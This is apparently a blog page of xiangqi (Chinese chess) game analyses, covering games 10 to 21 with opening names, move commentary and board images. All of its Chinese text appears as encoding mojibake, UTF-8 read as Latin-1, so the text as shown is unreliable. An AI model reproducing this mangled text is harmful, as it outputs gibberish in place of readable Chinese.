<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322010833278.png" alt="image-20250322010833278"></p>
<p>åœ¨è¯¥å±€é¢ä¸‹ï¼Œé»‘æ–¹å·¡æ²³è½¦ä¼å›¾å…‘å’æ´»é©¬ï¼Œå®é™…ä¸Šé»‘æ–¹ä¹Ÿå°±åªæœ‰ä¸€ä¸ªè½¦èƒ½èµ°ç€ç©äº†ï¼Œå¦ä¸€ä¸ªè½¦ä»¥åŠä¸¤åŒ¹é©¬éƒ½å‘†ç“œæ½®è„¸çš„</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322011158972.png" alt="image-20250322011158972"></p>
<p>çº¢æ–¹å¿…é¡»ç‚¹è½¦äºŒè·¯ï¼Œé©¬ä¸Šå°±è¦æ‹é©¬å±</p>
<p>ä¸‹ä¸€æ­¥é»‘æ–¹è¦æ˜¯è¡¥å£«ç›´æ¥å°±æ‹7é©¬å±è‚¡</p>
<p>è¦æ˜¯ç»§ç»­å†²å’ï¼Œå†²3å’å°±æ‹3é©¬å±è‚¡ï¼Œå†²7å’å°±æ‹7é©¬å±è‚¡</p>
<h4 id="ç¬¬10å±€-çªå‘å†·ç®­"><a href="#ç¬¬10å±€-çªå‘å†·ç®­" class="headerlink" title="ç¬¬10å±€ çªå‘å†·ç®­"></a>ç¬¬10å±€ çªå‘å†·ç®­</h4><p>çªè¢­ç‹</p>
<p>çº¢é»‘åŒæ–¹å§é¾™å‡¤é›ï¼Œèµ°æˆè¿™ä¸ªå±€é¢ï¼Œç”šè‡³éƒ½æ²¡æ³•å‘½å</p>
<p>é»‘æ–¹å·¦è½¦è€é¼ ä¸€æ ·é’»åˆ°çº¢æ–¹è¢«çªé‡Œï¼Œç„¶åå¹³åˆ°2è·¯æ‰ç‚®åŒæ—¶å°è½¦ï¼Œçº¢æ–¹ä¸éœ€è¦èº²ç‚®ï¼Œç›´æ¥å¹³è½¦é‚€å…‘ï¼Œå¼ƒé©¬ï¼Œå…ˆå¼ƒåå–</p>
<p>å‹¾å¼•é»‘å³ç‚®å‘å°„æ‰“é©¬ï¼Œä½¿å¾—é»‘å·¦é©¬è„±æ ¹ï¼Œçº¢å†ç”¨å³è½¦å‹é»‘é©¬</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322014607629.png" alt="image-20250322014607629"></p>
<h4 id="ç¬¬11å±€-å¹¶éæ€¥æ‰€"><a href="#ç¬¬11å±€-å¹¶éæ€¥æ‰€" class="headerlink" title="ç¬¬11å±€ å¹¶éæ€¥æ‰€"></a>ç¬¬11å±€ å¹¶éæ€¥æ‰€</h4><p>æ¾å¼›ç‹</p>
<p>é¡ºç‚®ç›´è½¦å¯¹ç¼“å¼€è½¦ - é»‘è¿‡æ²³ç‚®</p>
<p>åœ¨å½“å‰å±€é¢ä¸‹ï¼Œçº¢æ–¹è·³èµ·åŒæ­£é©¬ï¼Œé»‘æ–¹æ­£ç€ä¹Ÿæ˜¯å³é©¬æ­£èµ·ï¼Œ</p>
<p>ç„¶è€Œè¯¯èµ°ç‚®2å¹³3å‹é©¬</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322015954736.png" alt="image-20250322015954736"></p>
<p>èµ°è¿™ä¹ˆä¸€æ­¥ç‚®æ„ä¹‰ä¸æ˜ï¼Œç›¸å½“äºè®©äº†ä¸€å…ˆï¼Œè¿™å°†å¯¼è‡´é»‘æ–¹å³è½¦å‡ºä¸æ¥</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322020338512.png" alt="image-20250322020338512"></p>
<p>åœ¨å½“å‰å±€é¢ä¸‹ï¼Œé»‘æ–¹ä¼å›¾å‡ºå³ç›´è½¦ï¼Œçº¢æ–¹ç›´æ¥é€ä¸ƒå…µç„¶åé©¬ä¸ƒè¿›å…«ç”±è½¦ç”Ÿæ ¹ï¼Œåé¢å¥—ç€ç‚®æ‰“é»‘è½¦ï¼Œçˆ½çš„ä¸€æ‰¹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322020449687.png" alt="image-20250322020449687"></p>
<p>æŠŠé»‘è½¦èµ¶å›å»ä¹‹åï¼Œçº¢å†ç‚®å…«å¹³ä¸ƒæ‰“é©¬ï¼Œé»‘é€3å’ä¹‹åä¸Šé©¬ï¼Œåˆæš´éœ²äº†åº•è±¡ï¼Œçº¢ç‚®è½°åº•è±¡ï¼Œå–å¾—åº•çº¿å·¨å¤§æ”»åŠ¿</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322020717700.png" alt="image-20250322020717700"></p>
<h4 id="ç¬¬12å±€-æ¢¦ç¬”ç”ŸèŠ±-âœ¨"><a href="#ç¬¬12å±€-æ¢¦ç¬”ç”ŸèŠ±-âœ¨" class="headerlink" title="ç¬¬12å±€ æ¢¦ç¬”ç”ŸèŠ± âœ¨"></a>ç¬¬12å±€ æ¢¦ç¬”ç”ŸèŠ± âœ¨</h4><p>åšæ¢¦ç‹</p>
<p>é¡ºç‚®ç›´è½¦å¯¹ç¼“å¼€è½¦ - é»‘è¿‡æ²³ç‚®å±€é¢ä¸‹ï¼Œå½“çº¢æ–¹è·³èµ·æ­£é©¬ä¹‹åï¼Œé»‘æ–¹å”¯ä¸€æ­£ç€ä¹Ÿæ˜¯è·³æ­£é©¬ï¼Œä½†æ˜¯é»‘æ–¹å‡ºå·¦æ¨ªè½¦ï¼Œçœ‹ä¼¼æ²¡æœ‰é—®é¢˜ï¼Œå®é™…ä¸Šå’Œå³ç‚®è¿‡æ²³ä¸æ­é…ï¼Œä¸å¤Ÿç´§å‡‘ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322022231413.png" alt="image-20250322022231413"></p>
<p>æ­¤æ—¶é»‘æ–¹å·¦é©¬è„±æ ¹ï¼Œä½†æ˜¯ç›´æ¥è½¦äºŒè¿›å…­å†å¹³ä¸‰å‹çš„è¯ï¼Œé»‘å¯ä»¥ç‚®2å¹³7æ‰“å…µå€’å‹¾ä¿é©¬ã€‚åŸºäºä¸Šè¿°æ€è€ƒçº¢æ–¹ç«‹åˆ»å…µä¸‰è¿›ä¸€é€å…µï¼Œè®©é»‘å³ç‚®æ‰“ä¸è¿‡æ¥ï¼Œç„¶åå†è¿›è½¦å‹é©¬å°±å¯ä»¥äº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322022717748.png" alt="image-20250322022717748"></p>
<p>é»‘å·¦é©¬éå¸¸å°´å°¬ï¼Œå¦‚æœå†è½¦9è¿›1ä¿é©¬ï¼Œé‚£é»‘å·¦è½¦ç›¸å½“äºç™½è®©äº†ä¸€å…ˆ</p>
<p>å¦‚æœé©¬7è¿›6ï¼Œè¿™ä¸ªé©¬ä¹Ÿæ²¡äººçœ‹ç®¡ï¼Œä¼šé­åˆ°çº¢è½¦8å¹³6æŠ é©¬ï¼Œå¹¶ä¸”æ­¤æ—¶é»‘ä¸­å’å¤±å®ˆ</p>
<h4 id="ç¬¬13å±€-ç§£é©¬å‰å…µ"><a href="#ç¬¬13å±€-ç§£é©¬å‰å…µ" class="headerlink" title="ç¬¬13å±€ ç§£é©¬å‰å…µ"></a>ç¬¬13å±€ ç§£é©¬å‰å…µ</h4><p>è±èŒµç‹</p>
<p>åœ¨é¡ºç‚®ç›´è½¦å¯¹ç¼“å¼€è½¦å±€é¢ä¸‹ï¼Œé»‘æ–¹åæ‰‹èµ°é€†å¤©ä¸¤å¤´è›‡</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322024652326.png" alt="image-20250322024652326"></p>
<p>æ­¤åçº¢æ–¹çš„æ€è·¯å¾ˆå¯èƒ½æ˜¯å·¡æ²³è½¦å…‘å…µæˆ–è€…éª‘æ²³è½¦æ€å’</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322024928912.png" alt="image-20250322024928912"></p>
<p>ç„¶è€Œå¦‚æœçº¢æ–¹çœŸçš„è½¦å…«è¿›äº”éª‘æ²³ï¼Œé»‘æŠ¢å‡ºå³è½¦ï¼Œçº¢æ–¹å¦‚æœå…‘è½¦åˆ™å¤±å…ˆï¼Œå¦‚æœæ€å’åˆ™é¢ä¸´é»‘äº”ä¸ƒç‚®å ç‚®æ‰“è½¦æ‰“é©¬æ‰“åº•è±¡çš„æ”»åŠ¿</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322025136372.png" alt="image-20250322025136372"></p>
<p>å› æ­¤ä¸å¦‚èµ°ç¨³çš„ï¼Œç›´æ¥ç‚®æ‰“è¾¹å’ï¼Œä¸¤ä¸ªè½¦ä¸€å…‘ï¼Œå¤šä¸€ä¸ªè¾¹å…µç©æ®‹æ£‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322025304791.png" alt="image-20250322025304791"></p>
<h4 id="ç¬¬14å±€-ç†æƒ³é˜µå‹"><a href="#ç¬¬14å±€-ç†æƒ³é˜µå‹" class="headerlink" title="ç¬¬14å±€ ç†æƒ³é˜µå‹"></a>ç¬¬14å±€ ç†æƒ³é˜µå‹</h4><p>æƒ³è±¡ç‹</p>
<p>åœ¨é¡ºç‚®ç›´è½¦å¯¹æ¨ªè½¦ - é»‘å³æ¨ªè½¦å±€é¢ä¸‹ï¼Œçº¢æ–¹æ­£ç€æ˜¯å·¦ç‚®è¿›ä¸€ç„¶åå¹³ä¸‰è¿›æ”»é»‘7è·¯ï¼Œæˆ–è€…å·¦ç‚®è¿›äºŒå·¡æ²³å…‘å…µï¼Œ</p>
<p>ç„¶è€Œçº¢æ–¹è¯¯èµ°å·¦é©¬å†’è¿›ï¼Œå¸Œæœ›å½“é»‘å¹³è½¦æ‰é©¬æ—¶å†å·¦ç‚®å·¡æ²³ä¿é©¬ï¼Œç„¶åå¸ä¸­ç‚®å¥—åœ¨é©¬åæ‰“è½¦çˆ½çˆ½</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322030416873.png" alt="image-20250322030416873"></p>
<p>ç„¶è€Œé»‘æ–¹ä¹Ÿå¯ä»¥å¸ä¸­ç‚®æ ¼æŒ¡ï¼Œå¹¶ä¸”éšæ—¶æœ‰ç‚®å‡»åº•å£«æ‰“è½¦åŒæ—¶æ‰ç‚®çš„æ‰‹æ®µ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322030731253.png" alt="image-20250322030731253"></p>
<p>åªèƒ½è¯´ï¼Œçº¢æ–¹å·¦é©¬å†’è¿›ç„¶åå·¦ç‚®å·¡æ²³ï¼Œå»ºç«‹æ²³å£é˜µåœ°çš„æƒ³æ³•ï¼Œæ˜¯ä¸€å¢æƒ…æ„¿</p>
<h2 id="ä¸­ç‚®å¯¹å±é£é©¬"><a href="#ä¸­ç‚®å¯¹å±é£é©¬" class="headerlink" title="ä¸­ç‚®å¯¹å±é£é©¬"></a>ä¸­ç‚®å¯¹å±é£é©¬</h2><h3 id="ç–‘å½¢-1"><a href="#ç–‘å½¢-1" class="headerlink" title="ç–‘å½¢"></a>ç–‘å½¢</h3><h4 id="ç¬¬15å±€-ç‚®æ‰“åŒç¯"><a href="#ç¬¬15å±€-ç‚®æ‰“åŒç¯" class="headerlink" title="ç¬¬15å±€ ç‚®æ‰“åŒç¯"></a>ç¬¬15å±€ ç‚®æ‰“åŒç¯</h4><p>æ‰“ç‚®ç‹</p>
<p>ä¸­ç‚®è¿‡æ²³è½¦äº’è¿›ä¸ƒå…µå¯¹å±é£é©¬å¹³ç‚®å…‘è½¦ çº¢å·¦è¾¹ç‚®å¯¹é»‘é€€è¾¹ç‚®ä¸Šå³å£«</p>
<p>èµ°åˆ°å½“å‰å±€é¢ä¸‹ï¼Œçº¢æ–¹è½¦å…«å¹³ä¸ƒæ€å’å‹é©¬ï¼Œç€æ³•è¿‡äºå¼ºç¡¬ï¼Œä¼šé­åˆ°é»‘æ–¹æŠ¥å¤</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402193632147.png" alt="image-20250402193632147"></p>
<p>ä¸‹ä¸€æ­¥é»‘ç‚®2è¿›4å‡†å¤‡å†å¹³3ï¼Œå€’ç€æ‰“è½¦åŒæ—¶æ‰“çº¢åº•ä¸ƒç›¸ã€‚</p>
<p>åŒæ—¶é»‘7è·¯ç‚®ç„ç€çº¢ä¸‰ç›¸</p>
<p>çº¢çªå¿ƒé©¬ä¸èƒ½å…¼é¡¾ä¸¤ç›¸</p>
<p>æ‰€è°“ç‚®æ‰“åŒç™»å®é™…ä¸Šå°±æ˜¯é»‘åŒç‚®ç„çº¢åŒç›¸</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402193906042.png" alt="image-20250402193906042"></p>
<p>æ­¤æ—¶çº¢æ–¹æ²¡æ³•åƒé»‘é©¬ï¼Œå› ä¸ºé»‘ç‚®2å¹³3æ‰“æ­»è½¦ã€‚</p>
<p>çº¢æ–¹å¦‚æœå†²ä¸ƒå…µæƒ³è¦å†æŠŠå…µå¹³å¼€ç„¶ååƒé©¬ï¼Œè¿™æ ·æ¥ä¸åŠ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402195547220.png" alt="image-20250402195547220"></p>
<p>é»‘æ–¹ç‚®2å¹³3é©±èµ¶çº¢è½¦ï¼Œç„¶åè½¦2è¿›8å‡†å¤‡å†å¹³4æŠ½è½¦ï¼ŒåŒæ—¶æ‰“åº•è±¡å«é—·æ€</p>
<p>æ­¤æ—¶çº¢å¿…é¡»è½¦å…­é€€ä¸‰æŠ“é»‘ç‚®</p>
<p>é»‘æ–¹å¦‚æœè¶³å¤Ÿå¤§èƒ†ç›´æ¥å°±å¼€å§‹ç‚®æ‰“åŒç¯äº†ï¼Œä¿å®ˆä¸€ç‚¹å¯ä»¥è½¦å…«é€€äºŒçœ‹ç‚®ï¼ŒåŒæ—¶ä¼æœ‰ç‚®æ‰“åº•ç›¸æŠ½çº¢è½¦çš„æ‰‹æ®µã€‚</p>
<p>å¹¶ä¸”å€ŸåŠ©ç‚®æ‰“åŒç¯å¯ä»¥ç™½é£æ‰çº¢ä¸ƒå…µï¼Œæ­¤å±€é¢é»‘æ–¹å¤§ä¼˜</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402195749530.png" alt="image-20250402195749530"></p>
<p>ä¸Šå˜å¦‚æœçº¢ä¸èµ°å…µä¸ƒè¿›ä¸€ï¼Œæ”¹èµ°é©¬ä¸ƒè¿›å…­</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402195955720.png" alt="image-20250402195955720"></p>
<p>é»‘æ–¹ç…§æ ·æ˜¯å…ˆå¹³ç‚®æ‰“è½¦ç„¶åè½¦2è¿›8å‡†å¤‡å†å¹³4æ‹‰ä½çº¢è½¦é©¬</p>
<p>å¦‚æœçº¢é©¬è¸©ä¸­å’åˆ™æŠ¬å¦ä¸€ä¸ªè½¦æ‹‰ä½</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402200121082.png" alt="image-20250402200121082"></p>
<h4 id="ç¬¬16å±€-ç¥å…µå¤©é™"><a href="#ç¬¬16å±€-ç¥å…µå¤©é™" class="headerlink" title="ç¬¬16å±€ ç¥å…µå¤©é™"></a>ç¬¬16å±€ ç¥å…µå¤©é™</h4><p>å…µç‹</p>
<p>ä¸­ç‚®è¿‡æ²³è½¦äº’è¿›ä¸ƒå…µå¯¹å±é£å—å·¦é©¬ç›˜æ²³ çº¢å·¦è¾¹ç‚®å¯¹é»‘é£å³è±¡ å±€é¢ä¸‹</p>
<p>é»‘ç‚®2è¿›1æ‰“ç®—å†²3å’æ‰“è½¦åå‡»ã€‚</p>
<p>ç„¶è€Œè¿™æ‹›æ£‹å®é™…ä¸Šæœ‰å¤§é—®é¢˜ï¼Œç”šè‡³æˆ‘è¿™ç§èœé¸¡éƒ½çŸ¥é“èµ°è¿™ä¹ˆä¸€æ­¥å¤ªæ€ªäº†ï¼Œå¤ªç¼“äº†ã€‚</p>
<p>æ­¤æ—¶çº¢æ–¹å°±å¯ä»¥è€ƒè™‘æ‰“ä¸­å…µå«æŠ½ï¼Œ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402202249283.png" alt="image-20250402202249283"></p>
<p>ä½†æ˜¯é»‘æ–¹è¿˜æœ‰ä¸€åŒ¹3é©¬åœ¨é˜²å®ˆï¼Œå¯ä»¥è€ƒè™‘å‹¾å¼•é»‘3é©¬ç¦»å¼€ä½ç½®ã€‚</p>
<p>ç›´æ¥ç‚®ä¹è¿›å››ï¼Œé€åˆ°é©¬å£ä¸Š</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402202617068.png" alt="image-20250402202617068"></p>
<p>å¦‚æœé»‘è´ªåƒï¼Œé‚£ä¹ˆä¸­å…µå¤±å®ˆ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402202724075.png" alt="image-20250402202724075"></p>
<p>çº¢æ–¹å…ˆå¼ƒåå–ï¼Œè½¦å…«è¿›å…­åƒç‚®ï¼Œç„¶åå†ç‚®äº”è¿›å››æŠ½è½¦å¾—å›å¤±å­ã€‚</p>
<p>æ­¤å±€é¢ä¸‹çº¢æ–¹è½¦é©¬çµæ´»ï¼Œç‚®é•‡å½“å¤´ï¼Œå¹¶ä¸”ç‰µä½äº†é»‘æ— æ ¹è½¦ç‚®ï¼Œçº¢å¤§ä¼˜</p>
<h4 id="ç¬¬17å±€-å¤šäº‹ä¹‹ç§‹"><a href="#ç¬¬17å±€-å¤šäº‹ä¹‹ç§‹" class="headerlink" title="ç¬¬17å±€ å¤šäº‹ä¹‹ç§‹"></a>ç¬¬17å±€ å¤šäº‹ä¹‹ç§‹</h4><p>äº‹åŒ…ç‹</p>
<p>ä¸­ç‚®å¯¹å±é£é©¬äº’è¿›ä¸‰å…µå±€é¢ä¸‹ï¼Œçº¢æ–¹å·¦ç‚®è¿‡æ²³å‡†å¤‡å¹³ä¸ƒå‹é©¬æˆ–è€…å¹³ä¸‰æ‰“å’å‹é©¬ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402203532777.png" alt="image-20250402203532777"></p>
<p>é»‘æ–¹çœ¼çœ‹7å’æ²¡æ³•æŒºè¿›ï¼Œ7é©¬å·²ç»è¢«å‹åˆ¶ï¼Œå› æ­¤èµ¶ç´§è·³èµ·3é©¬é˜²æ­¢è¢«å‹ï¼ŒåŒæ—¶ä¼æœ‰å’3è¿›1è¸©ç‚®åå‡»çš„æ‰‹æ®µã€‚ç„¶è€Œé»‘æ–¹æ¥ä¸åŠ</p>
<p>æ­¤æ—¶çº¢æ–¹çœ¼è§å°±æœ‰éª‘æ²³è½¦æŠ“é©¬çš„æ‰‹æ®µï¼ŒæŠ“çš„è·Ÿæµªé¸­å­ä¼¼çš„</p>
<p>å¦‚æœé»‘é©¬3è¿›4</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œçº¢å·¦é©¬å¯ä»¥å¼ƒæ‰ï¼Œåæ­£ç›´æ¥æŠ¬æ¨ªè½¦ä¿æŒå…ˆæ‰‹ï¼Œéšæ—¶å¯ä»¥å¾—å›å¤±å­ã€‚</p>
<p>å¦‚æœè¿™æ—¶å€™æŠŠå·²ç»å‡ºå»çš„é«˜è½¦å€’å›æ¥æŠ“é©¬ï¼Œé‚£å°±æˆäº†é€›èŠ±å›­äº†ï¼Œä¸‰å…µä¹Ÿä¼šé€æ‰ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402204521121.png" alt="image-20250402204521121"></p>
<p>å¦‚æœé»‘é©¬3è¿›2ï¼Œé‚£ä¹ˆçº¢è¦æŠŠä¸ƒè·¯è½¦é€€å›æ¥æ‹¦ï¼Œå› ä¸ºæ­¤æ—¶é»‘é©¬åé¢æœ‰ç‚®çœ‹ç€ã€‚</p>
<p>æ¥ä¸‹æ¥çº¢æ–¹å°±å¯»æ±‚åŠ£é©¬æ¢é»‘å¥½é©¬ï¼Œèµšå–æ­¥æ•°ä¸Šçš„ä¼˜åŠ¿ã€‚</p>
<h4 id="ç¬¬18å±€-æ²¿æ²³ä¹‹äº‰"><a href="#ç¬¬18å±€-æ²¿æ²³ä¹‹äº‰" class="headerlink" title="ç¬¬18å±€ æ²¿æ²³ä¹‹äº‰"></a>ç¬¬18å±€ æ²¿æ²³ä¹‹äº‰</h4><p>æŠ¢æ²³ç‹</p>
<p>ä¸­ç‚®å¯¹å±é£å—äº’è¿›ä¸‰å…µå±€é¢ä¸‹</p>
<p>çº¢æ–¹è¿‡æ²³ç‚®ï¼Œå‡†å¤‡å¹³ä¸ƒæˆ–è€…å¹³ä¸‰å‹é©¬</p>
<p>æ­¤æ—¶é»‘æ–¹æ­£æ‰‹æ˜¯é£7è±¡ï¼Œä¸ºä»€ä¹ˆä¸æ˜¯3è±¡å‘¢ï¼Ÿ</p>
<p>å› ä¸ºé»‘æ–¹7å’è¢«ç„ï¼Œå¦‚æœé£3è±¡åˆ™çº¢ç‚®å…«å¹³ä¸‰æ‰“å’ç„é»‘åº•7è±¡ï¼ŒåŒæ—¶çº¢ä¸‰å…µä¼ºæœºè¿‡æ²³</p>
<p>å› æ­¤é£7è±¡å¯ä»¥é¿å…è¿™ä¸ªéšæ‚£</p>
<p><img src="/../../../../AppData/Roaming/Typora/typora-user-images/image-20250402205852088.png" alt="image-20250402205852088"></p>
<p>æ­¤åçº¢ç‚®å…«å¹³ä¸ƒå‹é©¬ï¼Œç„é»‘åº•3è±¡ã€‚æ€»ä¹‹å°±æ˜¯é»‘é£å“ªä¸ªè±¡ï¼Œçº¢å°±ç„å¦ä¸€ä¸ªè±¡</p>
<p>æ¥ä¸‹æ¥çš„å±€é¢ï¼Œé»‘æ–¹å·¡æ²³ç‚®ä¼ºæœºå…‘7å’æ´»é©¬</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402210330108.png" alt="image-20250402210330108"></p>
<p>æ¥ä¸‹æ¥é»‘æŒº7å’ï¼Œçº¢æ–¹ä¸åº”è¯¥ç«‹åˆ»å…‘å…µï¼Œè€Œæ˜¯åº”è¯¥å³è½¦å·¡æ²³ï¼Œæ³¨æ„æ˜¯å³è½¦ï¼Œå› ä¸ºå³è½¦æœ‰é¢ä¸´é»‘å€ŸåŠ©å·¡æ²³ç‚®ä¸Šå¤–é©¬æ‰“è½¦çš„æ‰‹æ®µã€‚</p>
<p>çº¢æ–¹å³è½¦å·¡æ²³åï¼Œé»‘æ–¹ä¹Ÿä¸åº”è¯¥ç«‹åˆ»7å’è¿‡æ²³ï¼Œå¦åˆ™è¿™æ ·ä¼šé€ç»™çº¢æ–¹è½¦äºŒå¹³ä¸‰ä¸€æ­¥æ£‹ï¼Œçº¢æœ‰é«˜è½¦ï¼Œé»‘ä¸¤è½¦éƒ½ä¸å¥½å‡ºï¼Œçº¢ä¼˜ã€‚</p>
<p>é»‘æ–¹çš„æ­£ç€æ˜¯è¡¥å£«ç­‰ä¸€æ‰‹ã€‚</p>
<p>æ­¤åçº¢æ–¹èµ°æˆå››å…µè§é¢ã€‚é»‘æ–¹åªèƒ½æ˜¯æ­»å®ˆï¼Œå› ä¸ºçº¢æ–¹æ˜¯å·¡æ²³è½¦æ¯”é»‘æ–¹å·¡æ²³ç‚®å¿«ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402212813196.png" alt="image-20250402212813196"></p>
<p>åŒæ–¹åœ¨æ²³å£å‰‘æ‹”å¼©å¼ ï¼Œçº¢æ–¹é˜µå‹æ˜¾ç„¶æ›´å¥½ï¼Œè½¦æ›´é å‰ï¼ŒåŒé©¬çµæ´»ã€‚æ¥ä¸‹æ¥çº¢æ–¹åŒé©¬å¯ä»¥éšæ—¶è·ƒå‡ºå‚æˆ˜ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402213037610.png" alt="image-20250402213037610"></p>
<p>å¦‚æœé»‘æ–¹ä»ç„¶æ­»å®ˆï¼Œæ¯”å¦‚è½¦8å¹³6ï¼Œé‚£ä¹ˆçº¢æ–¹ä¸ƒå…µè¿‡æ²³ä¹‹åå†ä¸Šå·¦é©¬è¸©é»‘ç‚®ï¼Œçº¢æ–¹å¤§ä¼˜</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402214313226.png" alt="image-20250402214313226"></p>
<h4 id="ç¬¬20å±€-è¿·é€”ç¾”ç¾Š"><a href="#ç¬¬20å±€-è¿·é€”ç¾”ç¾Š" class="headerlink" title="ç¬¬20å±€ è¿·é€”ç¾”ç¾Š"></a>ç¬¬20å±€ è¿·é€”ç¾”ç¾Š</h4><p>ç¾”ç‹</p>
<p>äº”ä¸ƒç‚®è¿›ä¸‰å…µå¯¹å±é£é©¬è¿›ä¸‰å’å±€é¢ä¸‹</p>
<p>çº¢æ–¹å³é©¬è‰ç‡è·ƒèµ·ï¼Œä½†æ˜¯æ²¡æœ‰æ˜ç¡®çš„è¿›æ”»ç›®æ ‡ï¼Œåªæœ‰ä¸€ä¸ª7å’å¯ä»¥è¸©ï¼Œå…¶ä»–ç‚¹ä½éƒ½è¢«é»‘é©¬é˜²å®ˆä½ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402215022944.png" alt="image-20250402215022944"></p>
<p>æ­¤æ—¶é»‘ç«‹åˆ»å·¦ç‚®éª‘æ²³æ‰“é©¬</p>
<p>å¦‚æœçº¢é©¬é€€å›åˆ™é»‘ç™½èµšäº†ä¸€æ­¥æ£‹</p>
<p>å¦‚æœçº¢é©¬è¸©7å’ï¼Œé»‘è¿›ç‚®ä¸€æ­¥ï¼Œå‡†å¤‡æ‰“çº¢ä¸ƒå…µã€‚çº¢ä¸ƒè·¯ç‚®æœ¬æ¥å°±æƒ³æ‰“é»‘3é©¬ï¼Œå› æ­¤çº¢æ–¹ä¸èƒ½æ¥æ”¶ä¸ƒå…µè¢«æ‰“ï¼Œæ¥ä¸‹æ¥çº¢åˆå†²ä¸ƒå…µã€‚çº¢æ–¹ä¸€ç›´åœ¨èµ°å…µé©¬è¿™ç§å¼±å­ã€‚å®é™…ä¸Šé»‘æ–¹å–äº†3å’å’Œ7å’åŠ é€Ÿå‡ºåŠ¨äº†å¤§å­—ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402215416737.png" alt="image-20250402215416737"></p>
<p>æœ€ç»ˆå±€é¢çº¢æœ‰ä¸€ä¸ªè¿‡æ²³å…µï¼Œä½†æ˜¯é»‘è½¦å‡ºåŠ¨æ›´å¿«</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402215625028.png" alt="image-20250402215625028"></p>
<h4 id="ç¬¬21å±€-æŠ¢å å¸ƒç½®çº¿"><a href="#ç¬¬21å±€-æŠ¢å å¸ƒç½®çº¿" class="headerlink" title="ç¬¬21å±€ æŠ¢å å¸ƒç½®çº¿"></a>ç¬¬21å±€ æŠ¢å å¸ƒç½®çº¿</h4><p>æŠ¢çº¿ç‹</p>
<blockquote>
<p>å›¾ä¸­é«˜äº®è¡Œå³ä¸ºå¸ƒç½®çº¿ï¼Œå®é™…ä¸Šä¹Ÿå°±æ˜¯ç‚®å°çº¿</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402220447000.png" alt="image-20250402220447000"></p>
</blockquote>
<p>åœ¨äº”ä¸ƒç‚®äº’è¿›ä¸‰å…µå¯¹å±é£é©¬è¾¹å’å³é©¬å¤–ç›˜æ²³ çº¢å·¦æ¨ªè½¦å¯¹é»‘é£å³è±¡å±€é¢ä¸­</p>
<p>çº¢å³é©¬å†’è¿›æ²³å£ï¼Œä¸€ä½¿å¾—å³è½¦è„±æ ¹ï¼ŒäºŒä½¿å¾—å¸ƒç½®çº¿ä¸Šå°‘äº†ä¸€ä¸ªç‚®æ¶ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402221059943.png" alt="image-20250402221059943"></p>
<p>æ¥ä¸‹æ¥é»‘æ–¹å³é©¬è¸©è¾¹å’ï¼Œè¸©ç‚®ï¼Œå°†é»‘ç‚®é©±ç¦»ï¼Œæ­¤æ—¶çº¢æ–¹å¸ƒç½®çº¿å°±æ²¡æœ‰ç‚®ç«é˜²çº¿äº†ã€‚é»‘å·¦ç‚®å é¢†çº¢å³ç‚®å°ï¼Œæ‰“é©¬</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402221405962.png" alt="image-20250402221405962"></p>
<p>å¦‚æœçº¢æ–¹è®¤ä¸ºä¸€ç‚¹é—®é¢˜éƒ½æ²¡æœ‰ï¼Œè¾¹é©¬æœ‰è±¡é˜²å®ˆï¼Œç»§ç»­èµ°é©¬å››è¿›ä¸‰è´ªå…µ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402221549202.png" alt="image-20250402221549202"></p>
<p>æ­¤æ—¶é»‘ç‚®æ‰“é©¬ï¼Œè¦æ±‚å…‘è½¦ï¼Œçº¢æ–¹å¿…é¡»å…‘è½¦å› ä¸ºè½¦æ²¡æ ¹ã€‚</p>
<p>ä½†æ˜¯é»‘æ–¹æ¥ä¸‹æ¥å¼ƒè½¦ï¼Œç‚®1å¹³3æ‰“è±¡å«é—·å®«ã€‚</p>
